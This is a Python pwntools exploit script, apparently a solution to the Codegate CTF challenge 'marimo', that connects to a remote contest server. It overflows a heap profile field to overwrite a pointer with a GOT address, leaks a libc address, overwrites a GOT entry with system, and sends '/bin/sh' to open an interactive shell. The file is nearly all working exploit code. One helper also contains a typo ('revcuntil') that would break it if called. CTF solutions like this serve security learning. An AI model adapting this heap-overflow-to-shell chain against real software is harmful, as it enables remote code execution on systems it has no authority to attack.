from pwn import *

def Buy_nopay(name, profile):
	p.recvuntil(">> ")
	p.sendline("show me the marimo")
	p.recvuntil("What's your new marimo's name? (0x10)\n")
	p.sendline(name)
	p.recvuntil(">> ")
	p.sendline(profile)

def Buy(size, name, profile):
	p.recvuntil(">> ")
	p.sendline("B")
	p.recvuntil(">> ")
	p.sendline(str(size))
	p.recvuntil(">> ")
	p.sendline("P")
	p.recvuntil("What's your new marimo's name? (0x10)\n")
	p.sendline(name)
	p.recvuntil(">> ")
	p.sendline(profile)

def Sell(idx, flag):
	p.recvuntil(">> ")
	p.sendline("S")
	p.recvuntil(">> ")
	p.sendline(str(idx))
	p.recvuntil("It's ")
	pay = p.revcuntil(" ")[:-1]
	p.recvuntil("?")
	p.sendline(flag)

def View(idx, modify):
	p.recvuntil(">> ")
	p.sendline("V")
	p.recvuntil(">> ")
	p.sendline(str(idx))
	p.recvuntil("profile : ")
	res = p.recvuntil("\n")[:-1]
	p.recvuntil(">> ")
	p.sendline("M")
	p.recvuntil(">> ")
	p.sendline(modify)
	p.recvuntil(">> ")
	p.sendline("B")
	return res

if __name__ == '__main__':
#p = process("./marimo")
	p = remote("ch41l3ng3s.codegate.kr", 3333)
	elf = ELF("./marimo")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

	context.log_level = 'debug'
	exit_got = 0x603030

	Buy_nopay("AAAA","BBBB")
	Buy_nopay("CCCC","DDDD")

	pay = "A"*40 + p64(0x21) + p64(0x000000015a7580ba) + p64(exit_got) + p64(exit_got)
	sleep(2)
	View(0,pay)
	data = View(1,"")
	print data
	leak = u64(data.ljust(8,'\x00'))
	print "0x%x" % leak
	libc_base = leak - 0x20740
	print "0x%x" % libc_base
	sleep(1)
	View(0,"A"*40 + p64(0x21) + p64(0x000000015a7580ba) + p64(0x603040)*2)
	View(1,p64(libc_base + libc.symbols['system'])[:-1])
	p.sendline('/bin/sh\x00')
	p.interactive()
